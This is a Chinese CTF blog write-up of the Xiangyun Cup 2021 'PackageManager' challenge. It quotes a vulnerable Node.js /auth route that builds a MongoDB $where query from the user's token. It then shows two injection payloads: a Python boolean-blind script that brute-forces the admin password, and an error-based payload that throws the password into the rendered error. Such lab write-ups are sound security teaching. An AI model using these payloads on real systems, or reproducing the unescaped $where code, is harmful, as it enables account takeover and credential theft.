---
title: 祥云杯 2021 PackageManager writeup
date: 2022-03-23 17:41:00
updated: 2022-03-23 17:41:00
tags: [ctf,security]
category: CTF
---

# 祥云杯 2021 PackageManager writeup

这题在BUUOJ上有复现环境，是个mongodb注入的题目，也有xsleaks的解法但是我目前还没搞明白，以下是两种注入的解法

## 布尔盲注

注册登录后发现是个包管理的页面，可以创建自己的包，那么根据源码初始化数据库这一部分，比较显然我们需要登录admin的账号然后admin会有个包里面有flag。

![image-20220323161015566](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323161015566.png)

![image-20220323160826952](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323160826952.png)

那我们的目标就是找到admin用户的密码

漏洞产生的点是/auth接口，auth接口是用于验证submit package的用户是不是admin用户，然后是需要提交一个admin的token，这个token就是admin用户的密码的md5，我们可以在这里构造一下payload然后爆出password，从而实现admin用户登录。

正则检测的waf没有加`^$`,意味着后面可以加or条件，这个很关键

```tsx
router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});
```

我们构造token:`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a`使得括号内的值为

`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" || this.password[0]=="a"`

此时只要或条件成立语句就为真，写个脚本就可以爆出密码啦

```python
import requests
import string

url="http://d8ec246d-507e-4aaa-a226-d318473d31ec.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s%3Ay8Ne8sPLeY55QXmWPyh3WmPiuoDgOp6y.U3VuzJCBxWcb5AWW8CCkPJqnSmYJ1N9EnHvoR%2BBuGho",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        data={
            "_csrf": "YzvJKLZc-4Sp0gfSn-hIRIF4bUZu0nhXy0HU",
            "token": payload
        }
        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        # print(r.text)
        if "Found. Redirecting to" in r.text:
            print(payload)
            flag+=j
            print(flag)
            break
```



![image-20220323155929287](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323155929287.png)

![image-20220323160751490](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323160751490.png)

## 异常注入

同样的是对auth接口这里逻辑判断，利用了js的抛出异常和IIFE（立即调用函数表达式）来实现

`token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin`

逻辑判断语句为：`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()!="aaaaa"`

这里就是立即执行throw Error(this.password)，后面是!=还是== 字符串的值是什么都无所谓，只要是语法没问题然后语句正常执行，这里强制抛出异常，从源码中可以看到抛出的异常会被渲染出来，然后就能够看到password的值

```js
let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin""`).exec()
console.log(docs);
```

![image-20220323165452041](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323165452041.png)



